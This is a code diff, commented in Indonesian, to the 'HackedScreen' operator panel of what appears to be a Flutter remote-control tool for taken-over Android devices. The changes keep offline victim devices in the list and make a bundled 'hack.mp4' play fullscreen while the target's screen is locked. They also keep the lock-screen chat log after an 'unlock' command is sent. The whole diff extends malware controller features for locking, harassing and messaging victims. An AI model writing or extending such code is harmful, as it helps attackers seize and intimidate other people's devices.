@@ -50,9 +50,6 @@ class _HackedScreenState extends State<HackedScreen>
   bool _togglingProtection = false;
 
   // Play Video
-  String? _playVideoBase64;
-  String? _playVideoMime;
-  String? _playVideoFileName;
   bool _videoPlaying = false;
 
   final _lockTextCtrl = TextEditingController();
@@ -316,17 +313,45 @@ class _HackedScreenState extends State<HackedScreen>
               ?? 'Unknown Device';
           return {...d, 'deviceBrand': model, 'deviceName': model};
         }).toList();
+
+        // Merge: jangan replace total — update existing, tambah baru, pertahankan yg offline
+        final newMap = { for (final d in newDevices) d['deviceId'] as String: d };
+        final merged = <Map<String, dynamic>>[];
+        for (final existing in _devices) {
+          final id = existing['deviceId'] as String?;
+          if (id == null) continue;
+          if (newMap.containsKey(id)) {
+            final updated = Map<String, dynamic>.from(newMap[id]!);
+            // Pertahankan connectedAt pertama (jangan reset ke waktu reconnect)
+            updated['connectedAt'] = existing['connectedAt'] ?? updated['connectedAt'];
+            merged.add(updated);
+            newMap.remove(id);
+          } else {
+            // Tidak ada di response server → tandai offline, tetap di list
+            merged.add({...existing, 'online': false});
+          }
+        }
+        // Tambah device baru yang belum pernah ada
+        merged.addAll(newMap.values);
+        // Sort: online dulu, lalu lastSeen terbaru
+        merged.sort((a, b) {
+          final aO = a['online'] == true ? 1 : 0;
+          final bO = b['online'] == true ? 1 : 0;
+          if (aO != bO) return bO - aO;
+          return ((b['lastSeen'] as int? ?? 0).compareTo(a['lastSeen'] as int? ?? 0));
+        });
+
         String? newSelectedId   = _selectedDeviceId;
         String? newSelectedName = _selectedDeviceName;
         if (_selectedDeviceId != null) {
-          final sel = newDevices.firstWhere(
+          final sel = merged.firstWhere(
             (d) => d['deviceId'] == _selectedDeviceId,
             orElse: () => {},
           );
           if (sel.isEmpty) { newSelectedId = null; newSelectedName = null; }
         }
         setState(() {
-          _devices            = newDevices;
+          _devices            = merged;
           _selectedDeviceId   = newSelectedId;
           _selectedDeviceName = newSelectedName;
         });
@@ -1999,70 +2024,39 @@ class _HackedScreenState extends State<HackedScreen>
               ]),
               const SizedBox(height: 20),
 
-              // Preview / Pick area
-              GestureDetector(
-                onTap: _videoPlaying ? null : () async {
-                  final result = await FilePicker.platform.pickFiles(
-                    type: FileType.video, allowMultiple: false);
-                  if (result != null && result.files.single.path != null) {
-                    final file  = File(result.files.single.path!);
-                    final bytes = await file.readAsBytes();
-                    final ext   = result.files.single.extension?.toLowerCase() ?? 'mp4';
-                    final mime  = ext == 'mkv' ? 'video/x-matroska'
-                                : ext == 'webm' ? 'video/webm'
-                                : ext == '3gp'  ? 'video/3gpp'
-                                : 'video/mp4';
-                    setS(() {
-                      _playVideoBase64   = base64Encode(bytes);
-                      _playVideoMime     = mime;
-                      _playVideoFileName = result.files.single.name;
-                    });
-                  }
-                },
-                child: Container(
-                  width: double.infinity,
-                  constraints: _playVideoFileName != null
-                    ? const BoxConstraints(minHeight: 60)
-                    : const BoxConstraints(minHeight: 100),
-                  decoration: BoxDecoration(
-                    color: _playVideoFileName != null
-                      ? videoColor.withOpacity(0.08)
-                      : const Color(0xFF071525),
-                    borderRadius: BorderRadius.circular(12),
-                    border: Border.all(
-                      color: _playVideoFileName != null ? videoColor.withOpacity(0.5) : videoColor.withOpacity(0.2),
-                      width: _playVideoFileName != null ? 1.5 : 1)),
-                  padding: const EdgeInsets.all(16),
-                  child: _playVideoFileName != null
-                    ? Row(children: [
-                        Container(width: 40, height: 40,
-                          decoration: BoxDecoration(color: videoColor.withOpacity(0.15), borderRadius: BorderRadius.circular(8)),
-                          child: Center(child: SvgPicture.string(
-                            '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="2"/><polygon points="10 8 16 12 10 16 10 8"/></svg>',
-                            width: 20, height: 20, colorFilter: const ColorFilter.mode(videoColor, BlendMode.srcIn)))),
-                        const SizedBox(width: 12),
-                        Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-                          Text(_playVideoFileName!, overflow: TextOverflow.ellipsis,
-                            style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white, fontWeight: FontWeight.bold)),
-                          const SizedBox(height: 4),
-                          Text(_playVideoMime ?? '', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.white38)),
-                          if (_playVideoBase64 != null)
-                            Text('${(_playVideoBase64!.length * 0.75 / 1024 / 1024).toStringAsFixed(2)} MB',
-                              style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: videoColor.withOpacity(0.7))),
-                        ])),
-                        SvgPicture.string(
-                          '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>',
-                          width: 18, height: 18, colorFilter: const ColorFilter.mode(videoColor, BlendMode.srcIn)),
-                      ])
-                    : Column(mainAxisAlignment: MainAxisAlignment.center, children: [
-                        SvgPicture.string(
-                          '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="2"/><polygon points="10 8 16 12 10 16 10 8"/></svg>',
-                          width: 32, height: 32, colorFilter: ColorFilter.mode(videoColor.withOpacity(0.5), BlendMode.srcIn)),
-                        const SizedBox(height: 8),
-                        Text('Tap untuk pilih video', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11,
-                          color: Colors.white.withOpacity(0.4))),
-                      ]),
-                ),
+              // Info: video dari asset
+              Container(
+                width: double.infinity,
+                padding: const EdgeInsets.all(16),
+                decoration: BoxDecoration(
+                  color: videoColor.withOpacity(0.08),
+                  borderRadius: BorderRadius.circular(12),
+                  border: Border.all(color: videoColor.withOpacity(0.35), width: 1.5)),
+                child: Row(children: [
+                  Container(width: 42, height: 42,
+                    decoration: BoxDecoration(color: videoColor.withOpacity(0.15), borderRadius: BorderRadius.circular(8)),
+                    child: Center(child: SvgPicture.string(
+                      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="2"/><polygon points="10 8 16 12 10 16 10 8"/></svg>',
+                      width: 20, height: 20, colorFilter: const ColorFilter.mode(videoColor, BlendMode.srcIn)))),
+                  const SizedBox(width: 12),
+                  Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+                    const Text('hack.mp4', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 12,
+                      color: Colors.white, fontWeight: FontWeight.bold)),
+                    const SizedBox(height: 3),
+                    Text('assets/video/hack.mp4', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9,
+                      color: videoColor.withOpacity(0.7))),
+                  ])),
+                  SvgPicture.string(
+                    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>',
+                    width: 18, height: 18, colorFilter: const ColorFilter.mode(videoColor, BlendMode.srcIn)),
+                ]),
+              ),
+              const SizedBox(height: 8),
+              Padding(
+                padding: const EdgeInsets.only(left: 4),
+                child: Text('Video akan diputar fullscreen & layar terkunci di device target.',
+                  style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9,
+                    color: Colors.white.withOpacity(0.35))),
               ),
               const SizedBox(height: 20),
 
@@ -2077,22 +2071,17 @@ class _HackedScreenState extends State<HackedScreen>
                     child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
                 const SizedBox(width: 12),
                 Expanded(child: GestureDetector(
-                  onTap: _playVideoBase64 == null ? null : () async {
+                  onTap: () async {
                     Navigator.pop(ctx);
-                    await _sendCommand('play_video', {
-                      'videoBase64': _playVideoBase64,
-                      'mimeType':    _playVideoMime ?? 'video/mp4',
-                    });
+                    await _sendCommand('play_video', {});
                     setState(() => _videoPlaying = true);
                     _snack('Video sedang diputar di device!', isSuccess: true);
                   },
                   child: Container(
                     padding: const EdgeInsets.symmetric(vertical: 14),
-                    decoration: BoxDecoration(
-                      gradient: LinearGradient(colors: _playVideoBase64 != null
-                        ? [videoColor, const Color(0xFFBE185D)]
-                        : [Colors.grey.withOpacity(0.4), Colors.grey.withOpacity(0.3)]),
-                      borderRadius: BorderRadius.circular(12)),
+                    decoration: const BoxDecoration(
+                      gradient: LinearGradient(colors: [videoColor, Color(0xFFBE185D)]),
+                      borderRadius: BorderRadius.all(Radius.circular(12))),
                     child: const Center(child: Text('▶ PLAY', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12,
                       fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
               ])
@@ -2108,14 +2097,14 @@ class _HackedScreenState extends State<HackedScreen>
                 Expanded(child: GestureDetector(
                   onTap: () async {
                     await _sendCommand('play_video_stop', {});
-                    setState(() { _videoPlaying = false; _playVideoBase64 = null; _playVideoFileName = null; });
+                    setState(() => _videoPlaying = false);
                     setS(() {});
                     _snack('Video dihentikan', isSuccess: true);
                   },
                   child: Container(
                     padding: const EdgeInsets.symmetric(vertical: 14),
-                    decoration: BoxDecoration(gradient: const LinearGradient(colors: [Color(0xFFEF4444), Color(0xFFB91C1C)]),
-                      borderRadius: BorderRadius.circular(12)),
+                    decoration: const BoxDecoration(gradient: LinearGradient(colors: [Color(0xFFEF4444), Color(0xFFB91C1C)]),
+                      borderRadius: BorderRadius.all(Radius.circular(12))),
                     child: const Center(child: Text('■ STOP', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12,
                       fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
               ]),
@@ -3244,6 +3233,8 @@ class _LockChatScreenState extends State<_LockChatScreen> with TickerProviderSta
     super.initState();
     _pulseCtrl = AnimationController(vsync: this, duration: const Duration(seconds: 2))..repeat(reverse: true);
     _pulseAnim = Tween<double>(begin: 0.6, end: 1.0).animate(_pulseCtrl);
+    // Langsung load chat log dari server supaya history tidak hilang
+    _startChatPolling();
   }
 
   @override
@@ -3325,8 +3316,8 @@ class _LockChatScreenState extends State<_LockChatScreen> with TickerProviderSta
 
   Future<void> _unlock() async {
     await widget.onSendCommand('unlock', {});
-    setState(() { _isLocked = false; _chatMessages = []; });
-    _chatPollTimer?.cancel();
+    setState(() => _isLocked = false);
+    // Chat log tetap ada setelah unlock — tidak di-clear
     _snack('Device di-unlock', isSuccess: true);
   }
 
